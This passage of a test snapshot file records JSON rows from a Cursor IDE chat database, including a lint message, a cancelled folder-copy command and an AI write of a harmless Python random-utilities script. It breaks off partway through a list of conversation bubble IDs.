    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"0479c335-53be-4397-abc7-e6a80acda689","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T17:27:37.010Z","isQuickSearchQuery":false,"text":"Re-running lint checks:\\n","usageUuid":"89f55b82-651a-4ead-aa06-b938c8fcf1cd"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-26 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:04ec8cee-0472-4ca6-ad85-eb28f3b81e8c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"04ec8cee-0472-4ca6-ad85-eb28f3b81e8c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:37.404Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":15,"toolIndex":1,"modelCallId":"7b6eab12-0603-461e-984d-ae83ba409be9","toolCallId":"tool_3ce67e7d-8c6b-486d-a95e-435ba9b8cf9","status":"completed","rawArgs":"{\\"command\\": \\"mkdir -p /Users/jonathanafek/src/autofixer/_samples && cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/\\", \\"is_background\\": false}","name":"run_terminal_cmd","params":"{\\"command\\":\\"mkdir -p /Users/jonathanafek/src/autofixer/_samples && cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/\\",\\"requireUserApproval\\":true,\\"parsingResult\\":{\\"executableCommands\\":[{\\"name\\":\\"mkdir\\",\\"args\\":[{\\"type\\":\\"word\\",\\"value\\":\\"-p\\"},{\\"type\\":\\"word\\",\\"value\\":\\"/Users/jonathanafek/src/autofixer/_samples\\"}],\\"fullText\\":\\"mkdir -p /Users/jonathanafek/src/autofixer/_samples\\"},{\\"name\\":\\"cp\\",\\"args\\":[{\\"type\\":\\"word\\",\\"value\\":\\"-r\\"},{\\"type\\":\\"word\\",\\"value\\":\\"/Users/jonathanafek/src/autofixer/patchino/_samples/*\\"},{\\"type\\":\\"word\\",\\"value\\":\\"/Users/jonathanafek/src/autofixer/_samples/\\"}],\\"fullText\\":\\"cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/\\"}]},\\"requestedSandboxPolicy\\":{\\"type\\":\\"TYPE_INSECURE_NONE\\"}}","additionalData":{"status":"cancelled","reviewData":{"status":"None","selectedOption":"rejectAndTellWhatToDoDifferently","isShowingInput":false,"candidatesForAllowlist":["mkdir","cp"],"approvalType":"user"}},"result":"{\\"humanReviewV2\\":{\\"selectedOption\\":\\"skip\\"}}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-27 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:058513f2-aba7-449f-8e3b-7bba6cbceecc",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"058513f2-aba7-449f-8e3b-7bba6cbceecc","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-03T22:14:43.198Z","isQuickSearchQuery":false,"codeBlocks":[{"uri":{"scheme":"file","authority":"","path":"/Users/jonathanafek/src/autofixer/final_random_file.py","query":"","fragment":"","_formatted":"file:///Users/jonathanafek/src/autofixer/final_random_file.py","_fsPath":null},"codeblockId":"d90b6334-7162-4883-b2ff-a31da2d5802d","codeBlockIdx":0,"content":"#!/usr/bin/env python3\\n\\"\\"\\"\\nFinal random file - Python script with random utilities\\n\\"\\"\\"\\n\\nimport random\\nimport string\\nfrom datetime import datetime\\nfrom typing import List, Dict\\n\\n\\ndef generate_random_string(length: int = 10) -> str:\\n    \\"\\"\\"Generate a random alphanumeric string.\\"\\"\\"\\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\\n\\n\\ndef generate_random_numbers(count: int = 5) -> List[int]:\\n    \\"\\"\\"Generate a list of random numbers.\\"\\"\\"\\n    return [random.randint(1, 100) for _ in range(count)]\\n\\n\\ndef generate_random_data() -> Dict:\\n    \\"\\"\\"Generate a dictionary with random data.\\"\\"\\"\\n    return {\\n        'timestamp': datetime.now().isoformat(),\\n        'random_id': generate_random_string(8),\\n        'numbers': generate_random_numbers(7),\\n        'boolean': random.choice([True, False]),\\n        'float': round(random.uniform(0.0, 100.0), 2),\\n    }\\n\\n\\ndef main():\\n    \\"\\"\\"Main function to demonstrate random utilities.\\"\\"\\"\\n    print(\\"Random File Generator\\")\\n    print(\\"=\\" * 40)\\n    \\n    data = generate_random_data()\\n    print(f\\"Generated Data: {data}\\")\\n    \\n    print(f\\"\\\\nRandom String: {generate_random_string(12)}\\")\\n    print(f\\"Random Numbers: {generate_random_numbers(10)}\\")\\n    print(f\\"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}\\")\\n\\n\\nif __name__ == \\"__main__\\":\\n    main()","languageId":"python"}],"text":"","capabilityType":15,"toolFormerData":{"tool":38,"toolIndex":1,"modelCallId":"529cf7d3-2d5a-4134-8d1f-e992aec3b2b7","toolCallId":"tool_bd4b05f2-98d5-4aa9-8574-bc1d11f3a49","status":"completed","rawArgs":"{\\"file_path\\": \\"/Users/jonathanafek/src/autofixer/final_random_file.py\\", \\"contents\\": \\"#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nFinal random file - Python script with random utilities\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport random\\\\nimport string\\\\nfrom datetime import datetime\\\\nfrom typing import List, Dict\\\\n\\\\n\\\\ndef generate_random_string(length: int = 10) -> str:\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a random alphanumeric string.\\\\\\"\\\\\\"\\\\\\"\\\\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\\\\n\\\\n\\\\ndef generate_random_numbers(count: int = 5) -> List[int]:\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a list of random numbers.\\\\\\"\\\\\\"\\\\\\"\\\\n    return [random.randint(1, 100) for _ in range(count)]\\\\n\\\\n\\\\ndef generate_random_data() -> Dict:\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a dictionary with random data.\\\\\\"\\\\\\"\\\\\\"\\\\n    return {\\\\n        'timestamp': datetime.now().isoformat(),\\\\n        'random_id': generate_random_string(8),\\\\n        'numbers': generate_random_numbers(7),\\\\n        'boolean': random.choice([True, False]),\\\\n        'float': round(random.uniform(0.0, 100.0), 2),\\\\n    }\\\\n\\\\n\\\\ndef main():\\\\n    \\\\\\"\\\\\\"\\\\\\"Main function to demonstrate random utilities.\\\\\\"\\\\\\"\\\\\\"\\\\n    print(\\\\\\"Random File Generator\\\\\\")\\\\n    print(\\\\\\"=\\\\\\" * 40)\\\\n    \\\\n    data = generate_random_data()\\\\n    print(f\\\\\\"Generated Data: {data}\\\\\\")\\\\n    \\\\n    print(f\\\\\\"\\\\\\\\nRandom String: {generate_random_string(12)}\\\\\\")\\\\n    print(f\\\\\\"Random Numbers: {generate_random_numbers(10)}\\\\\\")\\\\n    print(f\\\\\\"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}\\\\\\")\\\\n\\\\n\\\\nif __name__ == \\\\\\"__main__\\\\\\":\\\\n    main()\\"}","name":"write","userDecision":"accepted","params":"{\\"relativeWorkspacePath\\":\\"/Users/jonathanafek/src/autofixer/final_random_file.py\\"}","additionalData":{"codeblockId":"d90b6334-7162-4883-b2ff-a31da2d5802d"},"result":"{\\"diff\\":{\\"chunks\\":[{\\"diffString\\":\\"- \\\\n+ #!/usr/bin/env python3\\\\n+ \\\\\\"\\\\\\"\\\\\\"\\\\n+ Final random file - Python script with random utilities\\\\n+ \\\\\\"\\\\\\"\\\\\\"\\\\n+ \\\\n+ import random\\\\n+ import string\\\\n+ from datetime import datetime\\\\n+ from typing import List, Dict\\\\n+ \\\\n+ \\\\n+ def generate_random_string(length: int = 10) -> str:\\\\n+     \\\\\\"\\\\\\"\\\\\\"Generate a random alphanumeric string.\\\\\\"\\\\\\"\\\\\\"\\\\n+     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\\\\n+ \\\\n+ \\\\n+ def generate_random_numbers(count: int = 5) -> List[int]:\\\\n+     \\\\\\"\\\\\\"\\\\\\"Generate a list of random numbers.\\\\\\"\\\\\\"\\\\\\"\\\\n+     return [random.randint(1, 100) for _ in range(count)]\\\\n+ \\\\n+ \\\\n+ def generate_random_data() -> Dict:\\\\n+     \\\\\\"\\\\\\"\\\\\\"Generate a dictionary with random data.\\\\\\"\\\\\\"\\\\\\"\\\\n+     return {\\\\n+         'timestamp': datetime.now().isoformat(),\\\\n+         'random_id': generate_random_string(8),\\\\n+         'numbers': generate_random_numbers(7),\\\\n+         'boolean': random.choice([True, False]),\\\\n+         'float': round(random.uniform(0.0, 100.0), 2),\\\\n+     }\\\\n+ \\\\n+ \\\\n+ def main():\\\\n+     \\\\\\"\\\\\\"\\\\\\"Main function to demonstrate random utilities.\\\\\\"\\\\\\"\\\\\\"\\\\n+     print(\\\\\\"Random File Generator\\\\\\")\\\\n+     print(\\\\\\"=\\\\\\" * 40)\\\\n+     \\\\n+     data = generate_random_data()\\\\n+     print(f\\\\\\"Generated Data: {data}\\\\\\")\\\\n+     \\\\n+     print(f\\\\\\"\\\\\\\\nRandom String: {generate_random_string(12)}\\\\\\")\\\\n+     print(f\\\\\\"Random Numbers: {generate_random_numbers(10)}\\\\\\")\\\\n+     print(f\\\\\\"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}\\\\\\")\\\\n+ \\\\n+ \\\\n+ if __name__ == \\\\\\"__main__\\\\\\":\\\\n+     main()\\",\\"oldStart\\":1,\\"newStart\\":1,\\"oldLines\\":1,\\"newLines\\":47,\\"linesRemoved\\":1,\\"linesAdded\\":47}],\\"editor\\":\\"EDITOR_AI\\"},\\"shouldAutoFixLints\\":true,\\"resultForModel\\":\\"Wrote contents to /Users/jonathanafek/src/autofixer/final_random_file.py.\\",\\"contentsAfterEdit\\":\\"#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nFinal random file - Python script with random utilities\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport random\\\\nimport string\\\\nfrom datetime import datetime\\\\nfrom typing import List, Dict\\\\n\\\\n\\\\ndef generate_random_string(length: int = 10) -> str:\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a random alphanumeric string.\\\\\\"\\\\\\"\\\\\\"\\\\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\\\\n\\\\n\\\\ndef generate_random_numbers(count: int = 5) -> List[int]:\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a list of random numbers.\\\\\\"\\\\\\"\\\\\\"\\\\n    return [random.randint(1, 100) for _ in range(count)]\\\\n\\\\n\\\\ndef generate_random_data() -> Dict:\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a dictionary with random data.\\\\\\"\\\\\\"\\\\\\"\\\\n    return {\\\\n        'timestamp': datetime.now().isoformat(),\\\\n        'random_id': generate_random_string(8),\\\\n        'numbers': generate_random_numbers(7),\\\\n        'boolean': random.choice([True, False]),\\\\n        'float': round(random.uniform(0.0, 100.0), 2),\\\\n    }\\\\n\\\\n\\\\ndef main():\\\\n    \\\\\\"\\\\\\"\\\\\\"Main function to demonstrate random utilities.\\\\\\"\\\\\\"\\\\\\"\\\\n    print(\\\\\\"Random File Generator\\\\\\")\\\\n    print(\\\\\\"=\\\\\\" * 40)\\\\n    \\\\n    data = generate_random_data()\\\\n    print(f\\\\\\"Generated Data: {data}\\\\\\")\\\\n    \\\\n    print(f\\\\\\"\\\\\\\\nRandom String: {generate_random_string(12)}\\\\\\")\\\\n    print(f\\\\\\"Random Numbers: {generate_random_numbers(10)}\\\\\\")\\\\n    print(f\\\\\\"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}\\\\\\")\\\\n\\\\n\\\\nif __name__ == \\\\\\"__main__\\\\\\":\\\\n    main()\\\\n\\"}"},"checkpointId":"30bcd88d-e3f8-4036-8a2c-3d3f4d85df7b"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-28 1`] = `
[
  {
    "key": "composerData:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53",
    "value": "{"_v":10,"composerId":"b777ffa2-b1cc-4064-a0a1-6bb58e24ad53","richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[],\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","hasLoaded":true,"text":"","fullConversationHeadersOnly":[{"bubbleId":"a8671dbe-8f02-428a-944f-35d85ea032f1","type":1},{"bubbleId":"16164b13-55d2-4d24-a754-3c21fa4ccdab","type":2,"serverBubbleId":"c6014502-ba6e-4285-ad66-7a9c4cc3c48e"},{"bubbleId":"470dcce6-6177-464d-b43c-4b641778e412","type":2},{"bubbleId":"c318e799-a2c1-4cbd-9f0f-a3fe578ce21e","type":2},{"bubbleId":"aec14c07-95b1-4f2a-bb8e-733459f9abfd","type":2},{"bubbleId":"462589a9-1a94-4ca1-956b-232feb5eb4d3","type":2},{"bubbleId":"354309a1-8d7b-44c6-b03b-cd8ad0daf622","type":2},{"bubbleId":"9e6f44f2-4782-4373-9887-bb890a26214e","type":2,"serverBubbleId":"4e357db2-b1cd-4efb-a0fb-150368d6e524"},{"bubbleId":"5549b140-13d6-4085-bada-7a78200fa06b","type":2},{"bubbleId":"99db702c-3b9f-4c60-ba54-cd6116b88e90","type":2},{"bubbleId":"8d0c07ec-9934-44ff-8996-eb4c00bf86b6","type":2},{"bubbleId":"e0ed03a1-7513-431a-8363-49f6733c309b","type":2},{"bubbleId":"bf6b0eea-d94d-4c87-acc7-a898f080cc4c","type":2,"serverBubbleId":"b286ef2d-d39b-49ef-bc42-3377a530f734"},{"bubbleId":"a2915804-4bfa-42ec-8984-5d0a8f295a0f","type":2},{"bubbleId":"b3dc23bf-da3f-45f4-a01d-ac170a73f955","type":2},{"bubbleId":"9ee2f72e-88c1-4c65-89d7-0f2b87a024d6","type":2,"serverBubbleId":"39c9e3ed-8f0f-4d31-9b81-081a8771c4f7"},{"bubbleId":"2f4bac40-80e1-4033-a90c-2fbcbe4e3b7e","type":2},{"bubbleId":"72359e21-fcd5-4393-90bb-c4f218cc2cb2","type":2},{"bubbleId":"bbbe25bd-d09e-41f2-a5f3-ee8dab9da51c","type":2},{"bubbleId":"09ceaf85-752d-470a-b853-b4524a17dd8c","type":2,"serverBubbleId":"0bc9633d-1054-4377-9c25-77913cfd26a5"},{"bubbleId":"f1c8cb8a-bad0-402b-ab2a-951c4f67c5cd","type":2},{"bubbleId":"04ec8cee-0472-4ca6-ad85-eb28f3b81e8c","type":2},{"bubbleId":"d666fd73-5722-4236-b901-18919ccd8b0e","type":2,"serverBubbleId":"d48970c7-8923-4dc3-a60e-fbe06685d50c"},{"bubbleId":"d2a7f755-0aca-4e15-b9c3-0e852ded490d","type":2},{"bubbleId":"f24ff6c3-6599-4f14-9aad-f500fbc76b42","type":2},{"bubbleId":"91726319-35ff-4ce0-a892-40ce8335a4d5","type":2},{"bubbleId":"99cb16d2-dc8f-4fc3-a1d4-e7ec76eafaa5","type":2,"serverBubbleId":"36e169a0-57c7-472a-a9ce-bbf2b39c566b"},{"bubbleId":"c9bf28ce-1f9a-4e5c-ab2f-64107c1a2e9d","type":1},{"bubbleId":"e25389b5-26a7-4d11-9a63-849c1b9792d1","type":2,"serverBubbleId":"930ecfa8-5e11-4c96-950d-189b1ce25810"},{"bubbleId":"c3d767bd-0285-42db-a245-8d057b30af0a","type":2},{"bubbleId":"d421068d-b5b6-4f79-a576-ce584a2a2511","type":2},{"bubbleId":"37b27e17-68e4-48ef-864b-422559538c33","type":2},{"bubbleId":"10e93b02-7d34-4558-b9d3-38ca22fa7cd0","type":2,"serverBubbleId":"1b50dd7d-493f-4211-b01f-876054739be7"},{"bubbleId":"ef5464b8-5aa8-4898-8ccb-ade9f57afbee","type":2},{"bubbleId":"e907c411-21c1-4838-a886-daf251f32dcf","type":2,"serverBubbleId":"c7ca7b36-ad4d-4a06-9d0e-fc4bb1b0ec32"},{"bubbleId":"64e04b3b-260a-4e94-9d71-858d21971508","type":2},{"bubbleId":"60590c4d-1080-4028-8feb-b3ffe9aa9759","type":1},{"bubbleId":"bf7fd2dc-c0da-4986-bfe8-74194fcd858e","type":2,"serverBubbleId":"50c94372-e2ba-4a56-9e6e-7934b048728c"},{"bubbleId":"5082343a-a1ac-4eff-a2be-5b7f27a96a2e","type":2},{"bubbleId":"d668df1f-e868-4528-ac19-0aaa09f4252c","type":2},{"bubbleId":"424b33b2-a7b5-4ba5-8989-4db4eb8aebf5","type":2},{"bubbleId":"2b11edac-9a03-481e-992d-cb2941b0d4ee","type":2,"serverBubbleId":"45a16431-4b9e-4ef3-8765-ebbe72d89641"},{"bubbleId":"17006763-caff-4688-ab50-e73e61dcdefb","type":2},{"bubbleId":"20358b0a-a113-43a9-b53e-2305f82ae2d0","type":2,"serverBubbleId":"e63a4752-0c28-442a-81a0-222fe088619f"},{"bubbleId":"39ce1345-7e78-435e-8c6f-95142b0eea52","type":2},{"bubbleId":"0056c9a5-859b-4b7d-91aa-788a6fdededa","type":1},{"bubbleId":"e210e8c1-8635-4177-8901-b19da83840df","type":2,"serverBubbleId":"a469299c-c5e6-43bf-8ded-a8939a648094"},{"bubbleId":"f4b3a653-58f6-4d63-9c48-c99e61ab6215","type":2},{"bubbleId":"3674dbb4-9c1c-4254-92a7-7e6588b5a738","type":2},{"bubbleId":"5396746f-2ba0-4fe4-91a4-456b134359df","type":2},{"bubbleId":"f3afadea-aa2f-4b24-8e5d-55fdd43953f5","type":2,"serverBubbleId":"5d58adc5-3575-4a13-a25b-ccc5669aa0e1"},{"bubbleId":"32060cd4-f99b-4bbe-bc17-7d2058e8691f","type":2},{"bubbleId":"8fceee72-c5bc-4726-82f5-73161cdc1dce","type":2,"serverBubbleId":"637ca50c-0158-4cb5-a78b-aac8d1c4c939"},{"bubbleId":"874108be-c324-4db5-bea8-c006882d4a9f","type":2},{"bubbleId":"b28e504e-5060-4a09-83d2-c85c721f18da","type":1},{"bubbleId":"06bec39c-a420-44e1-8901-257c1687adb3","type":2,"serverBubbleId":"45217c8b-30a5-4eb7-9125-03d9f2d61c30"},{"bubbleId":"4b22a165-5e37-43d2-9a21-84e0b5a86216","type":2},{"bubbleId":"eff6d6dc-32d7-44df-924b-dbbd75ded762","type":2},{"bubbleId":"5c6cc316-ae9f-4000-b36c-ba99def572e5","type":2},{"bubbleId":"90f81932-0006-47b2-a4ea-54efa804337b","type":2,"serverBubbleId":"19da0348-a510-4f00-a903-992ffca9c889"},{"bubbleId":"063560e4-a300-4363-8040-a7b3b99d180e","type":2},{"bubbleId":"670ee031-ee48-4fca-a778-3ad9275dc48e","type":2,"serverBubbleId":"9e93eab1-3c12-42fc-8946-d4bee48353a0"},{"bubbleId":"6b749c92-5a45-4b4e-adc4-96a479421ac5","type":2},{"bubbleId":"05c5b297-05fd-46af-8a30-e3fb7cdc208d","type":1},{"bubbleId":"e521ad96-a3cf-4fe1-b87c-64e5afa5d9fc","type":2,"serverBubbleId":"24c1b27f-cac0-4a0f-ad18-07e2bcf608e3"},{"bubbleId":"703c7088-988e-4983-b1fd-614be28daf00","type":2},{"bubbleId":"26c4e848-8ac3-47e0-8f38-a400d774949b","type":2},{"bubbleId":"0cdade13-5177-4c56-802f-43ac65b91cae","type":2},{"bubbleId":"3f1dc033-044e-45ef-90b9-22a87f325c5a","type":2,"serverBubbleId":"c1abf8bd-6c2e-4525-8858-6041950229f7"},{"bubbleId":"c5cbd89d-179e-406a-8480-017e918533f6","type":2},{"bubbleId":"7b53733c-c970-4582-a79f-0247a313dc9e","type":2,"serverBubbleId":"1d2ab835-5f99-463d-bbff-d2b48c006659"},{"bubbleId":"0373b0ea-305b-4f33-881c-5a466ef7d0e6","type":2},{"bubbleId":"aeebacb3-fb84-4ef0-aa86-5c62c85023bf","type":1},{"bubbleId":"cc32124b-c61c-400a-82ec-df1b5278342e","type":2,"serverBubbleId":"3f179c75-03da-4dcd-a161-1799b825ece6"},{"bubbleId":"1169aa0f-2edc-4258-88f3-982399349f76","type":2},{"bubbleId":"e51be9b8-1432-4782-9e34-e0f7b4fd60c0","type":2},{"bubbleId":"901a83b8-cad1-456d-a0ee-5044cf6c8aaa","type":2},{"bubbleId":"5f8e5411-99c8-48da-96e6-04928c048e90","type":2,"serverBubbleId":"2fb5dd7c-8e8f-488a-bc6c-bd8196b56223"},{"bubbleId":"8ca9f836-bd48-4ffb-aee7-0b6b573cf1d0","type":2},{"bubbleId":"15088c46-25ff-4963-b5d8-f2d79e1aa661","type":2},{"bubbleId":"dcac64d6-e7fe-4015-841e-2d52eeae587f","type":2,"serverBubbleId":"af28761b-f82f-4250-a488-4fce4ee778a0"},{"bubbleId":"33baf043-0afa-44f5-b3fc-37f3fe5b2777","type":2},{"bubbleId":"61bbc729-6a32-418e-85a6-c82e05ae00be","type":2},{"bubbleId":"28624d07-ee36-48c3-b029-2b3ffb503591","type":2,"serverBubbleId":"c83921c7-bfe4-40e4-9099-f90cdc96d804"},{"bubbleId":"0e1ed1bb-4bd8-496b-8f87-fa6033a5b3d9","type":2},{"bubbleId":"246c1ae1-899f-41c1-b8d8-62839f3147ba","type":2},{"bubbleId":"bd8fa862-6a62-4056-b5be-18cca5685504","type":2},{"bubbleId":"48687ba0-76e4-4a3c-96d1-b997e8fbf745","type":2},{"bubbleId":"ce855cba-af71-4483-8ec6-82fddd504005","type":2,"serverBubbleId":"be438c45-2f31-44f4-8d9d-9d23fb62dedd"},{"bubbleId":"0479c335-53be-4397-abc7-e6a80acda689","type":2},{"bubbleId":"2a1915e3-be31-4d7d-acb5-e7e69c3455c7","type":2},{"bubbleId":"ee989ccc-8af5-4d98-acef-8c0239b8dd16","type":2,"serverBubbleId":"6c256fbb-1d00-4fbe-bfe1-a4b4e0bb5a76"},{"bubbleId":"665eb4e4-05fe-46e5-8639-3f7d565da699","type":2},{"bubbleId":"81ca1f63-70bd-4784-bb96-4737f2f74eee","type":1},{"bubbleId":"135fdbb7-55af-4a98-a964-500ef3585e91","type":2,"serverBubbleId":"2884d8ed-ed5d-45d0-84e6-d0e55647aca7"},{"bubbleId":"51cbfac7-5037-4cf2-8235-30bd11ba26a0","type":2},{"bubbleId":"8f13703a-2404-489f-ad27-c9905b3302f3","type":2},{"bubbleId":"07e60d3a-c118-4918-82e6-b4475aa49d3b","type":2,"serverBubbleId":"2e09c9ba-6e40-42e4-aab8-2261ec52eab6"},{"bubbleId":"a6a61e41-6502-4d50-ba64-685d93a69fd7","type":2},{"bubbleId":"c5f6df58-a472-40ef-bac4-82729c20dfb8","type":1},{"bubbleId":"9d173359-420f-4233-ade5-2fd4f508d9b1","type":2,"serverBubbleId":"228f4316-b781-4faf-9088-c4092caa7b8a"},{"bubbleId":"b18b4178-3138-4409-ad92-0bcf21dd58d1","type":2},{"bubbleId":"b85ce68a-237e-4950-96ae-a9afd2a8a1ec","type":2},{"bubbleId":"51c6da5f-33e7-43d5-bf1b-8d8e787a92c4","type":2,"serverBubbleId":"e29522aa-1f1a-45dc-a3bd-752e2ca9d813"},{"bubbleId":"34d48125-3262-4c8b-aa85-d1d682797c24","type":2},{"bubbleId":"10259b4e-777f-48de-b566-b705c236872c","type":1},{"bubbleId":"cb92d66b-d669-4366-ad7d-615fd245835c","type":2,"serverBubbleId":"5ddc161d-eb2d-4cb6-93a5-9e4b8cbc475a"},{"bubbleId":"a854dff0-4fc5-4bcc-8bfa-9cbe30aa9d82","type":2},{"bubbleId":"51d7caf4-0b94-4b5c-8750-1d09a9ca88ec","type":2},{"bubbleId":"14b54607-5b85-474a-9e24-89b6ba61adeb","type":2,"serverBubbleId":"c19aa4bc-cff1-45ec-8b53-5c55ae3a12cb"},{"bubbleId":"7ab97181-580c-4bed-928f-8190f44ce908","type":2},{"bubbleId":"df999b54-c363-4d0c-ba0c-17d97ee8e8bc","type":1},{"bubbleId":"0ca4c1c8-d4e5-4e69-8709-1f648fb8f306","type":2,"serverBubbleId":"fe5a175f-3635-4f0d-8405-2cbc3be69a7d"},{"bubbleId":"652f36dc-73e8-4cd5-a36f-5e044bb31623","type":2},{"bubbleId":"058513f2-aba7-449f-8e3b-7bba6cbceecc","type":2},{"bubbleId":"11eecd61-b006-487a-9bea-f2a661336bd5","type":2,"serverBubbleId":"c1256053-37e5-4a25-9831-00a8e7fa8d77"},{"bubbleId":"72b1a628-2617-48bd-8f40-979f37cb8e70","type":2},{"bubbleId":"9a22ff71-5228-41ec-aee3-c74f59836323","type":2,"serverBubbleId":"c12fb6dd-af93-461c-abc6-59ec877128fa"},{"bubbleId":"40d420a2-5b34-44ef-bd35-aabf7069d42c","type":2},{"bubbleId":"b9b13772-3e18-443f-9405-0a381a3bf75d","type":1},{"bubbleId":"0d88a3d1-40f7-403f-819f-8caaccb0ae13","type":2,"serverBubbleId":"6d09d3c7-1e47-49cf-8b18-a6b9750fa566"},{"bubbleId":"d3d18c05-f50a-4e38-8d05-5ac1726ae449","type":2},{"bubbleId":"f80299f1-a1a5-46c7-8b4c-dc50bfc68027","type":2},{"bubbleId":"4fc